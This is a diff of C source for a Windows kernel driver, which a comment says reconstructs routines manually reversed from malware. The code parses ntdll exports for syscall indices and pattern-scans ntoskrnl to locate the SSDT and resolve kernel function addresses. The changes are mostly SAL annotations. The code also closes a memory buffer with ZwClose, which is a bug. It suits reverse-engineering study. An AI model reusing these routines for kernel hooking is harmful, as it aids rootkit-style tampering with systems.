@@ -17,9 +17,9 @@ Copyright (c) Fluxuss Software Security, LLC
 
 unsigned int FixRVAThings(
     
-    IMAGE_NT_HEADERS64* imgNtH, 
-    unsigned int uiVirtualAddress, 
-    unsigned int uiFileLowPart
+    _In_ IMAGE_NT_HEADERS64* imgNtH, 
+    _In_ unsigned int uiVirtualAddress,
+    _In_ unsigned int uiFileLowPart
 
 ) {
 
@@ -30,8 +30,7 @@ unsigned int FixRVAThings(
 
     for ( i = 0; ; ++i ) {
 
-        if ( i >= imgNtH->FileHeader.NumberOfSections )
-            return 0xFFFFFFFFi64;
+        if ( i >= imgNtH->FileHeader.NumberOfSections ) return 0xFFFFFFFF;
 
         if ( v6->VirtualAddress <= uiVirtualAddress && v6->Misc.PhysicalAddress + v6->VirtualAddress > uiVirtualAddress )
             break;
@@ -39,52 +38,45 @@ unsigned int FixRVAThings(
         ++v6;
     }
 
-    if ( v6->PointerToRawData + uiVirtualAddress - v6->VirtualAddress >= uiFileLowPart)
-        return ( unsigned int )-1;
-    else
-        return v6->PointerToRawData + uiVirtualAddress - v6->VirtualAddress;
+    if ( v6->PointerToRawData + uiVirtualAddress - v6->VirtualAddress >= uiFileLowPart ) return ( unsigned int )-1;
+    else return v6->PointerToRawData + uiVirtualAddress - v6->VirtualAddress;
 }
 
 
 unsigned int ParsePeFileExport(
     
-    IMAGE_DOS_HEADER* pDosH, 
-    unsigned int uiFileLowPart, 
-    const char* chNameExport, 
-    unsigned __int64* pImageBaseNtdll
+    _In_ IMAGE_DOS_HEADER* pDosH, 
+    _In_ unsigned int uiFileLowPart,
+    _In_ const char* chNameExport,
+    _In_ unsigned __int64* pImageBaseNtdll
 
 ) {
 
     IMAGE_DATA_DIRECTORY* DataDirectory;
 
-    if ( pDosH->e_magic != IMAGE_DOS_SIGNATURE )
-        return 0xFFFFFFFFi64;
+    if ( pDosH->e_magic != IMAGE_DOS_SIGNATURE ) return 0xFFFFFFFF;
 
     IMAGE_NT_HEADERS64* v6 = ( IMAGE_NT_HEADERS64* )( ( char* )pDosH + pDosH->e_lfanew );
 
-    if ( v6->Signature != IMAGE_NT_SIGNATURE )
-        return 0xFFFFFFFFi64;
+    if ( v6->Signature != IMAGE_NT_SIGNATURE ) return 0xFFFFFFFF;
 
-    if ( v6->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC )
-        DataDirectory = v6->OptionalHeader.DataDirectory;
-    else
-        DataDirectory = ( IMAGE_DATA_DIRECTORY* ) &v6->OptionalHeader.SizeOfHeapCommit;
+    if ( v6->OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR_MAGIC ) DataDirectory = v6->OptionalHeader.DataDirectory;
+    else DataDirectory = ( IMAGE_DATA_DIRECTORY* ) &v6->OptionalHeader.SizeOfHeapCommit;
 
     unsigned int virtualAddress = DataDirectory->VirtualAddress;
     unsigned int size = DataDirectory->Size;
 
     unsigned int checked_range_addr = FixRVAThings( 
         
-        v6,
-        DataDirectory->VirtualAddress,
-        uiFileLowPart
+        _In_ v6,
+        _In_ DataDirectory->VirtualAddress,
+        _In_ uiFileLowPart
     
     );
 
     *pImageBaseNtdll = v6->OptionalHeader.ImageBase;
 
-    if ( checked_range_addr == -1 )
-        return 0xFFFFFFFFi64;
+    if ( checked_range_addr == -1 ) return 0xFFFFFFFF;
 
     uint32_t* range_Addr = ( uint32_t* )( ( char* )&pDosH->e_magic + checked_range_addr );
 
@@ -92,46 +84,56 @@ unsigned int ParsePeFileExport(
 
     unsigned int v11 = FixRVAThings(
         
-        v6,
-        range_Addr[7],
-        uiFileLowPart
+        _In_ v6,
+        _In_ range_Addr[7],
+        _In_ uiFileLowPart
     
     );
 
     unsigned int v12 = FixRVAThings(
         
-        v6,
-        range_Addr[9],
-        uiFileLowPart
+        _In_ v6,
+        _In_ range_Addr[9],
+        _In_ uiFileLowPart
     
     );
 
     unsigned int v13 = FixRVAThings(
         
-        v6,
-        range_Addr[8],
-        uiFileLowPart
+        _In_ v6,
+        _In_ range_Addr[8],
+        _In_ uiFileLowPart
     
     );
 
-    if ( v11 == -1 || v12 == -1 || v13 == -1 )
-        return 0xFFFFFFFFi64;
+    if ( v11 == -1 || v12 == -1 || v13 == -1 ) return 0xFFFFFFFF;
 
     unsigned int v9 = ( unsigned int )-1;
 
     for ( unsigned int i = 0; i < v17; ++i ) {
         
-        unsigned int v14 = FixRVAThings( v6, *( uint32_t* )( ( char* )&pDosH->e_magic + 4 * i + v13 ), uiFileLowPart );
+        unsigned int v14 = FixRVAThings( 
+            
+            _In_ v6,
+            _In_ *( uint32_t* )( ( char* )&pDosH->e_magic + 4 * i + v13 ),
+            _In_ uiFileLowPart
+        
+        );
         
         if ( v14 != -1 ) {
             unsigned int v8 = *( uint32_t* )( ( char* ) &pDosH->e_magic + 4 * *( unsigned __int16* ) ( ( char* )&pDosH->e_magic + 2 * i + v12 ) + v11 );
 
-            if ( ( v8 < virtualAddress || v8 >= size + virtualAddress ) && !strcmp( ( const char* )pDosH + v14, chNameExport ) )
+            if ( ( v8 < virtualAddress || v8 >= size + virtualAddress ) && !strcmp( 
+                
+                _In_ ( const char* )pDosH + v14,
+                _In_ chNameExport
+            
+            ) )
                 return FixRVAThings(
                     
-                    v6,
-                    v8,
-                    uiFileLowPart
+                    _In_ v6,
+                    _In_ v8,
+                    _In_ uiFileLowPart
                 
                 );
         }
@@ -142,8 +144,8 @@ unsigned int ParsePeFileExport(
 
 PVOID allocate_and_set_memory(
     
-    char bFlag,
-    SIZE_T szMemRegion
+    _In_ char bFlag,
+    _In_ SIZE_T szMemRegion
 
 ) {
 
@@ -151,21 +153,27 @@ PVOID allocate_and_set_memory(
     //Todas as rotinas aqui estão no malware e foram revertidas por mim manualmente.
     PVOID pMemory = ExAllocatePoolWithTag(
         
-        NonPagedPool,
-        szMemRegion,
-        'HIDE'
+        _In_ NonPagedPool,
+        _In_ szMemRegion,
+        _In_ 'HIDE'
     
     ); 
 
-    if ( bFlag && pMemory ) memset( pMemory, 0, szMemRegion );
+    if ( bFlag && pMemory ) memset( 
+        
+        _Out_ pMemory,
+        _In_ 0,
+        _In_ szMemRegion
+    
+    );
 
     return pMemory;
 }
 
 NTSTATUS OpenNtdllAndParsePE(
     
-    const char* chNameSyscall,
-    const WCHAR* wNameSyscall
+    _In_ const char* chNameSyscall,
+    _In_ const WCHAR* wNameSyscall
 
 ) {
 
@@ -173,8 +181,8 @@ NTSTATUS OpenNtdllAndParsePE(
 
     RtlInitUnicodeString(
         
-        &ucString,
-        wNameSyscall
+        _Out_ &ucString,
+        _In_ wNameSyscall
     
     );
 
@@ -189,24 +197,23 @@ NTSTATUS OpenNtdllAndParsePE(
     objectAttributes.SecurityDescriptor = 0i64;
     objectAttributes.SecurityQualityOfService = 0i64;
 
-    if ( KeGetCurrentIrql( ) )
-        return STATUS_UNSUCCESSFUL;
+    if ( KeGetCurrentIrql( ) ) return STATUS_UNSUCCESSFUL;
 
     HANDLE hFile;
 
     NTSTATUS ntStatus = ZwCreateFile(
         
-        &hFile,
-        0x80000000,
-        &objectAttributes, 
-        &ioStatusBlock, 
-        0i64, 
-        0x80u, 
-        1u, 
-        1u, 
-        0x20u,
-        0i64,
-        0
+        _Out_ &hFile,
+        _In_ 0x80000000,
+        _In_ &objectAttributes, 
+        _Out_ &ioStatusBlock,
+        _In_ 0i64,
+        _In_ 0x80u,
+        _In_ 1u,
+        _In_ 1u,
+        _In_ 0x20u,
+        _In_ 0i64,
+        _In_ 0
     
     );
 
@@ -216,19 +223,19 @@ NTSTATUS OpenNtdllAndParsePE(
 
     memset( 
         
-        &FileInformation,
-        0,
-        sizeof( FileInformation ) 
+        _Out_ &FileInformation,
+        _In_ 0,
+        _In_ sizeof( FileInformation )
     
     );
 
     if ( NT_SUCCESS( ZwQueryInformationFile(
 
-        hFile,
-        &ioStatusBlock,
-        &FileInformation,
-        0x18u,
-        FileStandardInformation
+        _In_ hFile,
+        _Out_ &ioStatusBlock,
+        _Out_ &FileInformation,
+        _In_ 0x18u,
+        _In_ FileStandardInformation
     
     ) ) ) {
 
@@ -236,8 +243,8 @@ NTSTATUS OpenNtdllAndParsePE(
 
         struct_malware.pMemBuffer = allocate_and_set_memory(
             
-            1,
-            struct_malware.fileLowPart
+            _In_ 1,
+            _In_ struct_malware.fileLowPart
         
         );
 
@@ -245,15 +252,15 @@ NTSTATUS OpenNtdllAndParsePE(
 
         ZwReadFile(
             
-            hFile,
-            0i64,
-            0i64,
-            0i64,
-            &ioStatusBlock,
-            struct_malware.pMemBuffer,
-            struct_malware.fileLowPart,
-            &byteOffset,
-            0i64
+            _In_ hFile,
+            _In_ 0i64,
+            _In_ 0i64,
+            _In_ 0i64,
+            _Out_ &ioStatusBlock,
+            _Out_ struct_malware.pMemBuffer,
+            _In_ struct_malware.fileLowPart,
+            _In_ &byteOffset,
+            _In_ 0i64
         
         );
 
@@ -261,16 +268,16 @@ NTSTATUS OpenNtdllAndParsePE(
 
     ZwClose(
 
-        hFile
+        _In_ hFile
     
     );
 
     struct_malware.section_range = ( unsigned int )ParsePeFileExport(
 
-        ( IMAGE_DOS_HEADER* )struct_malware.pMemBuffer,
-        struct_malware.fileLowPart,
-        chNameSyscall,
-        &struct_malware.image_base_ntdll
+        _In_ ( IMAGE_DOS_HEADER* )struct_malware.pMemBuffer,
+        _In_ struct_malware.fileLowPart,
+        _In_ chNameSyscall,
+        _In_ &struct_malware.image_base_ntdll
     
     );
 
@@ -279,7 +286,7 @@ NTSTATUS OpenNtdllAndParsePE(
 
 uint32_t parserpentdll(
     
-    const char* nameexport
+    _In_ const char* nameexport
 
 ) {
 
@@ -287,9 +294,9 @@ uint32_t parserpentdll(
 
     memcpy( 
         
-        wNtDll, 
-        L"\\SystemRoot\\system32\\ntdll.dll", 
-        0x3Eui64
+        _Out_ wNtDll, 
+        _In_ L"\\SystemRoot\\system32\\ntdll.dll", 
+        _In_ 0x3Eui64
     
     );
 
@@ -297,19 +304,18 @@ uint32_t parserpentdll(
 
     if ( OpenNtdllAndParsePE(
         
-        nameexport,
-        wNtDll
+        _In_ nameexport,
+        _In_ wNtDll
     
-    ) < 0 )
-        return  0xFFFFFFFF;
+    ) < 0 ) return  0xFFFFFFFF;
 
     char* pChecking = ( char* )struct_malware.pMemBuffer + struct_malware.section_range;
 
     DbgPrintEx(
         
-        0,
-        0,
-        "Going seek: %X < %X",
+        _In_ 0,
+        _In_ 0,
+        _In_ "Going seek: %X < %X",
         struct_malware.section_range,
         ( unsigned __int64 )struct_malware.fileLowPart
     
@@ -324,9 +330,9 @@ uint32_t parserpentdll(
 
         DbgPrintEx(
             
-            0,
-            0,
-            "Seeking: %X",
+            _In_ 0,
+            _In_ 0,
+            _In_ "Seeking: %X",
             pChecking[i]
         
         );
@@ -341,9 +347,10 @@ uint32_t parserpentdll(
     }
 
     if ( struct_malware.pMemBuffer )
+
         ZwClose(
             
-            struct_malware.pMemBuffer
+            _In_ struct_malware.pMemBuffer
         
         );
 
@@ -353,21 +360,21 @@ uint32_t parserpentdll(
 
 unsigned int FindSyscallIndexOnSsdt(
     
-    const char* nameexport
+    _In_ const char* nameexport
 
 ) {
 
     unsigned int p_find_syscall_addy = parserpentdll(
         
-        nameexport
+        _In_ nameexport
     
     );
 
     DbgPrintEx(
         
-        0,
-        0,
-        "SSDT Syscall INDEX: 0x%X",
+        _In_ 0,
+        _In_ 0,
+        _In_ "SSDT Syscall INDEX: 0x%X",
         p_find_syscall_addy
     
     );
@@ -377,7 +384,7 @@ unsigned int FindSyscallIndexOnSsdt(
 
 PVOID GetNtOsKrnl(
     
-    PULONG puImageSize
+    _Out_ PULONG puImageSize
 
 ) {
 
@@ -385,10 +392,10 @@ PVOID GetNtOsKrnl(
 
     ZwQuerySystemInformation(
         
-        SystemModuleInformation,
-        &ulSystemBufferSize,
-        0,
-        &ulSystemBufferSize
+        _In_ SystemModuleInformation,
+        _Inout_ &ulSystemBufferSize,
+        _In_ 0,
+        _Out_opt_ &ulSystemBufferSize
     
     );
 
@@ -396,9 +403,9 @@ PVOID GetNtOsKrnl(
 
     PSYSTEM_MODULE_INFORMATION  pSystemInfoBuffer = ( PSYSTEM_MODULE_INFORMATION )ExAllocatePoolWithTag(
         
-        NonPagedPool,
-        ulSystemBufferSize * 2,
-        'xxp'
+        _In_ NonPagedPool,
+        _In_ ulSystemBufferSize * 2,
+        _In_ 'xxp'
     
     );
 
@@ -406,18 +413,18 @@ PVOID GetNtOsKrnl(
 
     memset(
         
-        pSystemInfoBuffer, 
-        0, 
-        ulSystemBufferSize * 2
+        _Out_ pSystemInfoBuffer, 
+        _In_ 0,
+        _In_ ulSystemBufferSize * 2
     
     );
 
     ZwQuerySystemInformation(
 
-        SystemModuleInformation,
-        pSystemInfoBuffer,
-        ulSystemBufferSize * 2,
-        &ulSystemBufferSize
+        _In_ SystemModuleInformation,
+        _Inout_ pSystemInfoBuffer,
+        _In_ ulSystemBufferSize * 2,
+        _Out_opt_ &ulSystemBufferSize
     
     );
 
@@ -427,16 +434,16 @@ PVOID GetNtOsKrnl(
     
     DbgPrintEx(
         
-        0,
-        0,
-        "Path: %s",
+        _In_ 0,
+        _In_ 0,
+        _In_ "Path: %s",
         pSystemInfoBuffer->Module[0].FullPathName
     
     );
 
     ExFreePool(
         
-        pSystemInfoBuffer
+        _In_ pSystemInfoBuffer
     
     );
 
@@ -451,19 +458,19 @@ PSSDTStruct GetFunction(
 
     ULONG_PTR PLACE = ( ULONG_PTR )GetNtOsKrnl(
         
-        &pImageSize
+        _Out_ &pImageSize
     
     );
 
     PIMAGE_NT_HEADERS ntHeaders = RtlImageNtHeader(
         
-        ( PVOID )PLACE
+        _In_ ( PVOID )PLACE
     
     );
 
     PIMAGE_SECTION_HEADER pTextSection = IMAGE_FIRST_SECTION64(
         
-        ntHeaders
+        _In_ ntHeaders
     
     );
 
@@ -472,11 +479,17 @@ PSSDTStruct GetFunction(
     for ( KiSSSOffset = 0; KiSSSOffset < pTextSection->Misc.VirtualSize - sizeof( KiSystemServiceStartCodePattern ); KiSSSOffset++ )
         if ( RtlCompareMemory(
             
-            ( ( unsigned char* )PLACE + pTextSection->VirtualAddress + KiSSSOffset ), KiSystemServiceStartCodePattern, sizeof( KiSystemServiceStartCodePattern ) ) == sizeof( KiSystemServiceStartCodePattern ) ) 
+            _In_ ( ( unsigned char* )PLACE + pTextSection->VirtualAddress + KiSSSOffset ),
+            _In_ KiSystemServiceStartCodePattern,
+            _In_ sizeof( KiSystemServiceStartCodePattern)
+        
+        )
+            == sizeof( _In_ KiSystemServiceStartCodePattern ) )
+
             break;
         
 
-    ULONG_PTR address = PLACE + pTextSection->VirtualAddress + KiSSSOffset + sizeof( KiSystemServiceStartCodePattern );
+    ULONG_PTR address = PLACE + pTextSection->VirtualAddress + KiSSSOffset + sizeof( _In_ KiSystemServiceStartCodePattern );
 
     if ( ( *( unsigned char* )address == 0x4c ) &&
         ( *( unsigned char* )( address + 1 ) == 0x8d ) &&
@@ -490,7 +503,7 @@ PSSDTStruct GetFunction(
 
 PVOID GetFunctionAddress(
     
-    const char* apiname
+    _In_ const char* apiname
 
 ) {
     
@@ -500,15 +513,15 @@ PVOID GetFunctionAddress(
 
     ULONG readOffset = ( ULONG )FindSyscallIndexOnSsdt(
         
-        apiname
+        _In_ apiname
     
     );
 
     DbgPrintEx(
         
-        0,
-        0,
-        "OK...\r\n"
+        _In_ 0,
+        _In_ 0,
+        _In_ "OK...\r\n"
     
     );
 
